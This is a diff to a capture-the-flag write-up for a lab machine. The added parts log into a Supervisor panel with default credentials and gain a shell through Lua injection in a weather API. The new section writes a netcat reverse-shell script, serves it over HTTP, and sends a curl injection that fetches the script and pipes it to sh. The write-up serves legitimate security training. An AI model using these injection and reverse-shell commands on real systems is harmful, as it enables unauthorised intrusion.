@@ -208,7 +208,48 @@ Let's have a look at the scripts using the browser dev tools and make a note of 
 
 Visiting both websites (port 80 and 9001) presents us with an authentication popup, with no indication of what the sites are. However, looking at the nmap output, we can see that the site on port 80 is running "nginx 1.19.0" and the site on port 9001 is running "Medusa httpd 1.12 (Supervisor process manager)".
 
-In addition, we found the /weather/forecast route on the port 80 website, so let's check that out:
+A google search for "supervisord default creds" finds the following page:
+
+{% embed url="http://supervisord.org/configuration.html#unix-http-server-section-example" %}
+
+The default creds are- user:123, and if we try these, we get in:
+
+![](<../../.gitbook/assets/9 (1).JPG>)
+
+There is some information here about running processes which may be useful later on. Let it refresh a couple of times as we see more processes:
+
+```
+/python3.8 /usr/pkg/bin/supervisord-3.8 
+root        348  0.0  0.0  71344  2896 ?     Is    9:09AM 0:00.00 /usr/sbin/sshd 
+_httpd      376  0.0  0.0  34952  2008 ?     Ss    9:09AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
+root        402  0.0  0.0  20220  1656 ?     Is    9:09AM 0:00.02 /usr/sbin/cron 
+_httpd     5469  0.0  0.0  17892  1528 ?     S    11:15AM 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ 
+root        421  0.0  0.0  22348  1592 ttyE1 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE1 
+root        388  0.0  0.0  21776  1588 ttyE2 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE2 
+root        433  0.0  0.0  19780  1584 ttyE3 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE3 
+
+
+USER        PID %CPU %MEM    VSZ   RSS TTY   STAT STARTED    TIME COMMAND
+root          0  0.0  0.2      0 11896 ?     DKl   9:09AM 0:01.41 [system]
+root          1  0.0  0.0  19848  1520 ?     Is    9:09AM 0:00.01 init 
+root        163  0.0  0.0  33724  2288 ?     Ss    9:09AM 0:00.02 /usr/sbin/syslogd -s 
+r.michaels  185  0.0  0.0  34996  1960 ?     Is    9:09AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels -b /home/r.michaels/devel/www 
+nginx       271  0.0  0.1  34112  3448 ?     I     9:09AM 0:00.17 nginx: worker process 
+root        298  0.0  0.0  23468  1336 ?     Is    9:09AM 0:00.00 /usr/sbin/powerd 
+root        299  0.0  0.0  33372  1848 ?     Is    9:09AM 0:00.00 nginx: master process /usr/pkg/sbin/nginx 
+_httpd      336  0.0  0.3 121400 16132 ?     Ss    9:09AM 0:02.64 /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 
+root        348  0.0  0.0  71344  2896 ?     Is    9:09AM 0:00.00 /usr/sbin/sshd 
+_httpd      376  0.0  0.0  34952  2008 ?     Is    9:09AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www 
+root        402  0.0  0.0  20220  1656 ?     Ss    9:09AM 0:00.02 /usr/sbin/cron 
+_httpd     4949  0.0  0.0      0     0 ?     R          - 0:00.00 /usr/bin/egrep ^USER| \\[system\\] *$| init *$| /usr/sbin/sshd *$| /usr/sbin/syslogd -s *$| /usr/pkg/bin/python3.8 /usr/pkg/bin/supervisord-3.8 *$| /usr/sbin/cron *$| /usr/sbin/powerd *$| /usr/libexec/httpd -u -X -s.*$|^root.* login *$| /usr/libexec/getty Pc ttyE.*$| nginx.*process.*$ (sh)
+root        421  0.0  0.0  22348  1592 ttyE1 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE1 
+root        388  0.0  0.0  21776  1588 ttyE2 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE2 
+root        433  0.0  0.0  19780  1584 ttyE3 Is+   9:09AM 0:00.00 /usr/libexec/getty Pc ttyE3 
+```
+
+For now, let's make a note of these and move on.
+
+We also found the /weather/forecast route on the port 80 website, so let's check that out:
 
 ![](<../../.gitbook/assets/2 (5).JPG>)
 
@@ -228,7 +269,7 @@ If we enter a special character suck as a single qoute, we get an interesting re
 
 ![](<../../.gitbook/assets/6 (3).JPG>)
 
-We can deduce from this that the Lua langauge is being used on the backend.
+The target is using the Lua langauge on the backend.
 
 A google search for "lua injection" finds the following article:
 
@@ -240,7 +281,7 @@ According to the article, if the developer allows unsanitized user input to be p
 
 ![](<../../.gitbook/assets/7 (2).JPG>)
 
-## Gaining Access
+## Gaining Access Method 1 - Browser
 
 Let's start a netcat listener. The payload we'll use is as follows:
 
@@ -293,6 +334,65 @@ $
 ```
 
 Unfortunately there is no python installed on the system, so let's move on.
+
+## Gaining Access Method 2 - Curl
+
+Instead of using the browser and URL encoding everything, we could also use "curl" to fetch a reverse shell script and run it.
+
+First, create a script as follows:
+
+```
+└─$ cat shell.sh                                                                                              2 ⚙
+#!/bin/sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 8585 >/tmp/f
+
+```
+
+Next, start a python web server in the directory with the shell script, and start a netcat listener:
+
+```
+└─$ python3 -m http.server                                                                                    2 ⚙
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+```
+
+```
+└─$ nc -nvlp 8585        
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::8585
+Ncat: Listening on 0.0.0.0:8585
+
+```
+
+Finally, run the following command:
+
+```
+└─$ curl "http://10.10.10.218/weather/forecast?city=London');os.execute('curl+10.10.14.3:8000/shell.sh|sh')--"
+```
+
+We see that the shell script is downloaded from our python web server:
+
+```
+└─$ python3 -m http.server                                                                                    2 ⚙
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.218 - - [24/Nov/2021 06:06:37] "GET /shell.sh HTTP/1.1" 200 -
+
+```
+
+And in our listener, we get a shell:
+
+```
+└─$ nc -nvlp 8585        
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::8585
+Ncat: Listening on 0.0.0.0:8585
+Ncat: Connection from 10.10.10.218.
+Ncat: Connection from 10.10.10.218:64347.
+sh: can't access tty; job control turned off
+$ id
+uid=24(_httpd) gid=24(_httpd) groups=24(_httpd)
+$ 
+```
 
 ## Enumeration as "\_httpd"
 
